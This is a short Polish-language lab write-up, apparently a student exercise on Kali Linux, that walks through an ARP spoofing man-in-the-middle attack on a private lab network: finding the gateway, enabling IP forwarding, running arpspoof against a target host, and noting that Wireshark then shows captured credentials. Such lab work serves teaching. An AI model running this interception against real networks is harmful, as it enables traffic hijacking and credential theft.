# Zadanie 7 - ARP Spoofing

### Ustalenie default gatway
```shell
┌──(kali㉿kali)-[~]
└─$ ip route show 
default via 192.168.179.2 dev eth0 proto dhcp src 192.168.179.129 metric 100 
192.168.179.0/24 dev eth0 proto kernel scope link src 192.168.179.129 metric 100 

```

### Uruchomienie możliwości przekazywanie pakietów
```shell
┌──(kali㉿kali)-[~]
└─$ sudo sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
```

### Wykonanie ataku ARP Spoofing
```shell
sudo arpspoof -i eth0 -t 192.168.179.135 192.168.179.2 
```

### Wireshark umożliwia odczytania kerdek
![b7ba003199bab6abf79cfb715fc2f64a.png](/_resources/b7ba003199bab6abf79cfb715fc2f64a.png)
